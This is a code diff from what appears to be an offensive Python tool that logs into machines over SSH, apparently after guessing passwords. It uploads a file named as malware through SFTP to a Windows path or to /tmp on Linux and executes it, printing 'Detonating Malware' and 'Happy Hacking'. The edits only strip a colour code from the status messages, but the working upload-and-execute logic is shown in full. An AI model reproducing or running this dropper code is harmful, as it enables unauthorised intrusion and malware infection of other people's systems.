@@ -63,15 +63,15 @@ def ssh_login(credentials):
 
             try:
 	            sftp = client.open_sftp()
-	            print(Fore.RED + "    └──=> " + Fore.BLUE + orange + Fore.WHITE + "Creating Updates Directory" + Fore.RESET)
+	            print(Fore.RED + "    └──=> " + orange + Fore.WHITE + "Creating Updates Directory" + Fore.RESET)
 	            sftp.mkdir(remote_directory)
-	            print(Fore.RED + "    └──=> " + Fore.BLUE + orange + Fore.WHITE + f"Uploading {malware} to: {windows_remote_path}" + Fore.RESET)
+	            print(Fore.RED + "    └──=> " + orange + Fore.WHITE + f"Uploading {malware} to: {windows_remote_path}" + Fore.RESET)
 	            sftp.put(windows_local_path, windows_remote_path)
 	            sftp.close()
-	            print(Fore.RED + "    └──=> " + Fore.BLUE + orange + Fore.WHITE + "Upload Successful: " + windows_remote_path +  Fore.RESET)
-	            print(Fore.RED + "    └──=> " + Fore.BLUE + orange + Fore.WHITE + "Detonating Malware: " + malware + Fore.RESET)
+	            print(Fore.RED + "    └──=> " + orange + Fore.WHITE + "Upload Successful: " + windows_remote_path +  Fore.RESET)
+	            print(Fore.RED + "    └──=> " + orange + Fore.WHITE + "Detonating Malware: " + malware + Fore.RESET)
 	            client.exec_command(windows_remote_path)
-	            print(Fore.RED + "    └──=> " + Fore.BLUE + orange + Fore.WHITE + "Happy Hacking" + Fore.RESET)
+	            print(Fore.RED + "    └──=> " + orange + Fore.WHITE + "Happy Hacking" + Fore.RESET)
 	            password_found.value = 1
             except Exception as fd:
 	            print(Fore.RED + "    └──=> " + "[!] " + Fore.WHITE + f"{str(fd)}" + Fore.RESET)
@@ -84,13 +84,13 @@ def ssh_login(credentials):
            
             try:
 	            sftp = client.open_sftp()
-	            print(Fore.RED + "    └──=> " + Fore.BLUE + orange + Fore.WHITE + "Uploading Malware to: /tmp folder" + Fore.RESET)
+	            print(Fore.RED + "    └──=> " + orange + Fore.WHITE + "Uploading Malware to: /tmp folder" + Fore.RESET)
 	            sftp.put(linux_local_path, linux_remote_path)
 	            sftp.close()
-	            print(Fore.RED + "    └──=> " + Fore.BLUE + orange + Fore.WHITE + "Upload Successful: " + linux_remote_path + Fore.RESET)
+	            print(Fore.RED + "    └──=> " + orange + Fore.WHITE + "Upload Successful: " + linux_remote_path + Fore.RESET)
 	            client.exec_command("cd /tmp/ && chmod +x " + malware + " && ./" + malware)
-	            print(Fore.RED + "    └──=> " + Fore.BLUE + orange + Fore.WHITE + "Detonating Malware: " + malware + Fore.RESET)
-	            print(Fore.RED + "    └──=> " + Fore.BLUE + orange + Fore.WHITE + "Happy Hacking" + Fore.RESET)
+	            print(Fore.RED + "    └──=> " + orange + Fore.WHITE + "Detonating Malware: " + malware + Fore.RESET)
+	            print(Fore.RED + "    └──=> " + orange + Fore.WHITE + "Happy Hacking" + Fore.RESET)
 	            password_found.value = 1
             except Exception as fd:
 	            print(Fore.RED + "    └──=> " + "[!] " + Fore.WHITE + f"Download Failed: {fd}" + Fore.RESET)
